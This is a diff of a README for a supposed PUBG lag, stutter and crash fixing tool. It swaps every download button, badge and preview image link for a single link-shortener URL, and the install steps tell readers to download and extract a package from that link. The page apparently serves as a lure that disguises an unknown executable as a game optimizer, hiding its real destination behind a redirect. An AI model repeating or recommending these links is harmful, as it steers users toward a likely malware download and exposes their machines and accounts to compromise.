@@ -10,28 +10,28 @@ The goal is to make PUBG feel **smoother and more consistent** by checking the s
 
 ## Quick Access
 
-[![PUBG](https://img.shields.io/badge/PUBG-BATTLEGROUNDS-d8a72b?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Lag Fix](https://img.shields.io/badge/Lag-Fix-e09b32?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Stutter](https://img.shields.io/badge/Stutter-Repair-6f42c1?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Crash](https://img.shields.io/badge/Crash-Repair-d73a49?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
+[![PUBG](https://img.shields.io/badge/PUBG-BATTLEGROUNDS-d8a72b?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Lag Fix](https://img.shields.io/badge/Lag-Fix-e09b32?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Stutter](https://img.shields.io/badge/Stutter-Repair-6f42c1?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Crash](https://img.shields.io/badge/Crash-Repair-d73a49?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download PUBG Performance Optimizer](https://idleobstacle.github.io/)**
+➡️ **[Download PUBG Performance Optimizer](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![PUBG Lag Fix performance toolkit](assets/pubg-lag-fix-preview.png)](https://idleobstacle.github.io/)
+[![PUBG Lag Fix performance toolkit](assets/pubg-lag-fix-preview.png)](https://flyn.co/17yeN7/)
 
 ### Optimizer Dashboard
 
-[![PUBG performance optimizer dashboard](assets/pubg-optimizer-dashboard.png)](https://idleobstacle.github.io/)
+[![PUBG performance optimizer dashboard](assets/pubg-optimizer-dashboard.png)](https://flyn.co/17yeN7/)
 
 > Preview metrics are illustrative. Actual latency, system load, temperatures, and smoothness depend on your hardware, drivers, connection, game version, server conditions, and background software.
 
@@ -164,7 +164,7 @@ The toolkit can help users locate logs and crash dumps so a real issue can be di
 
 1. Download the current package:
 
-   **[Download PUBG Performance Optimizer](https://idleobstacle.github.io/)**
+   **[Download PUBG Performance Optimizer](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Close PUBG before applying configuration changes.
